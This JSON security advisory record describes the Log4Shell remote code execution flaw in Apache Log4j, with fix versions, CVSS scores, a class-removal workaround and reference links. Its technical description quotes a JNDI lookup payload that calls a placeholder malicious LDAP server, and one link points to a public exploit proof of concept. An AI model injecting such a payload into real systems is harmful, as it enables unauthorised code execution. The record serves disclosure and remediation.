{
    "source": "BDSA",
    "name": "BDSA-2021-3731",
    "title": "Apache Log4j Vulnerable to Remote Code Execution (RCE) Through LDAP Access via JNDI and Specially Crafted Log Messages",
    "description": "Apache Log4j, as used in many popular services, is vulnerable to improperly allowing lightweight directory access protocol (LDAP) access via Java naming and directory interface (JNDI). A remote attacker able to supply the end application with specially crafted input that is then processed by the Log4j subcomponent could cause the execution of arbitrary Java code.\n\n**Note** \n\n- log4j-api packages by themselves do not contain the vulnerable functionality and are therefore unaffected. log4j-core packages and the upstream overarching source repository are affected.\n\n- A previously suggested mitigation of setting environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS=true` is not recommended. This mitigation has been proven inadequate against this vulnerability. \n\n- This vulnerability is partially fixed in [**2.15.0-rc2**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2) by [this](https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454) commit and [this](https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658) commit. These fixes were deemed incomplete. See BDSA-2021-3779 (CVE-2021-45046) for more details.\n\nThis vulnerability is listed as exploitable by the Cybersecurity & Infrastructure Security Agency in their [Known Exploited Vulnerabilities Catalog](https://www.cisa.gov/known-exploited-vulnerabilities-catalog).",
    "technicalDescription": "The issue arises because Log4j versions **2** and above will process specially crafted input of the form `${jndi:ldap://malicious.server/a}` and lookup and return Java code from a remote attacker controlled server. Several exploit techniques exist that leverage specific Java code paths/classes to achieve remote code execution (RCE).\n\nThe issue was partially fixed in version [**2.15.0-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1) by [this](https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454) commit and [this](https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3) commit. This patch and release were deemed inadequate and a further release [**2.15.0-rc2**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2) with [this](https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658) commit was made to correct the issue.\n\nA further vulnerability has been found (BDSA-2021-3779, CVE-2021-45046) that results in a bypass of these fixes when Log4j uses non-default pattern layouts. An attacker can still achieve RCE even with these patches and noted workarounds in place. The issue was corrected in version **2.16.0-rc1**.",
    "publishedDate": "2021-12-10T11:54:55.571Z",
    "updatedDate": "2022-05-06T11:44:23.358Z",
    "disclosureDate": "2021-12-09T00:00:00.000Z",
    "exploitPublishDate": "2021-12-09T00:00:00.000Z",
    "solution": "Fixed in versions:\n*  [**2.16.0-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1) by [this](https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d) commit.\n*  [**2.12.2-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.12.2-rc1) by [this](https://github.com/apache/logging-log4j2/commit/f819c83804152cb6ed94cb408302e36b21b65053) commit and [this](https://github.com/apache/logging-log4j2/commit/70edc233343815d5efa043b54294a6fb065aa1c5) commit.\n*   [**2.3.1-rc1**](https://github.com/apache/logging-log4j2/releases/tag/log4j-2.3.1-rc1) by [this](https://github.com/apache/logging-log4j2/commit/be848dacbac6df30c4f32b2852e24446033ecf79) commit and [this](https://github.com/apache/logging-log4j2/commit/f6564bb993d547d0a371b75d869042c334bf57f0) commit.\n\nThe latest releases can be found [here](https://github.com/apache/logging-log4j2/tags).\n\nNOTE: It is recommended to upgrade to version  [**2.17.0**](https://downloads.apache.org/logging/log4j/2.17.0/). This recommendation is due to related vulnerabilities (BDSA-2021-3779, CVE-2021-45046) affecting the version that this vulnerability is fixed in.",
    "severity": "CRITICAL",
    "cvss2": {
        "baseScore": 7.5,
        "impactSubscore": 6.4,
        "exploitabilitySubscore": 10.0,
        "severity": "MEDIUM",
        "accessVector": "NETWORK",
        "accessComplexity": "LOW",
        "authentication": "NONE",
        "confidentialityImpact": "PARTIAL",
        "integrityImpact": "PARTIAL",
        "availabilityImpact": "PARTIAL",
        "temporalMetrics": {
            "exploitability": "HIGH",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 6.5
        },
        "vector": "(AV:N/AC:L/Au:N/C:P/I:P/A:P/E:H/RL:OF/RC:C)"
    },
    "cvss3": {
        "baseScore": 9.8,
        "impactSubscore": 5.9,
        "exploitabilitySubscore": 3.9,
        "severity": "CRITICAL",
        "attackVector": "NETWORK",
        "attackComplexity": "LOW",
        "confidentialityImpact": "HIGH",
        "integrityImpact": "HIGH",
        "availabilityImpact": "HIGH",
        "privilegesRequired": "NONE",
        "scope": "UNCHANGED",
        "userInteraction": "NONE",
        "temporalMetrics": {
            "exploitability": "HIGH",
            "remediationLevel": "OFFICIAL_FIX",
            "reportConfidence": "CONFIRMED",
            "score": 9.4
        },
        "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C"
    },
    "useCvss3": true,
    "classifications": [],
    "zeroDay": false,
    "underReview": false,
    "parentAdvisory": false,
    "credit": "Alibaba Cloud security team",
    "workaround": "The vendor states that:\n\n> This issue can be mitigated in prior releases (<**2.16.0**) by removing the JndiLookup class from the classpath (example: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`).",
    "vendorFixDate": "2021-12-09T00:00:00.000Z",
    "vendorNotifiedDate": "2021-11-24T00:00:00.000Z",
    "bdsaTags": [
        "RCE"
    ],
    "overallScore": 9.4,
    "_meta": {
        "allow": [
            "GET"
        ],
        "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2021-3731",
        "links": [
            {
                "rel": "cwes",
                "href": "https://trendmicro2.app.blackduck.com/api/cwes/CWE-502"
            },
            {
                "rel": "related-vulnerability",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/CVE-2021-44228",
                "label": "NVD"
            },
            {
                "rel": "bdsa-ranges",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2021-3731/ranges"
            },
            {
                "rel": "reference",
                "href": "https://downloads.apache.org/logging/log4j/2.17.0/",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/001aaada7dab82c3c09cde5f8e14245dc9d8b454",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/27972043b76c9645476f561c5adc483dec6d3f5d",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/70edc233343815d5efa043b54294a6fb065aa1c5",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/be848dacbac6df30c4f32b2852e24446033ecf79",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/c77b3cb39312b83b053d23a2158b99ac7de44dd3",
                "label": "LINK"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/f6564bb993d547d0a371b75d869042c334bf57f0",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/commit/f819c83804152cb6ed94cb408302e36b21b65053",
                "label": "PATCH"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/pull/608#issuecomment-990264908",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.12.2-rc1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.16.0-rc1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/releases/tag/log4j-2.3.1-rc1",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/apache/logging-log4j2/tags",
                "label": "VENDOR_UPGRADE"
            },
            {
                "rel": "reference",
                "href": "https://github.com/kozmer/log4j-shell-poc",
                "label": "EXPLOIT"
            },
            {
                "rel": "reference",
                "href": "https://news.ycombinator.com/item?id=29507263",
                "label": "WORKAROUND"
            },
            {
                "rel": "reference",
                "href": "https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US",
                "label": "ADVISORY"
            },
            {
                "rel": "reference",
                "href": "https://www-cnblogs-com.translate.goog/yyhuni/p/15088134.html?_x_tr_sl=auto&_x_tr_tl=en&_x_tr_hl=en-US",
                "label": "WORKAROUND"
            },
            {
                "rel": "reference",
                "href": "https://www.cisa.gov/known-exploited-vulnerabilities-catalog",
                "label": "EXPLOIT"
            },
            {
                "rel": "default-remediation-status",
                "href": "https://trendmicro2.app.blackduck.com/api/vulnerabilities/BDSA-2021-3731/default-remediation-status"
            }
        ]
    }
}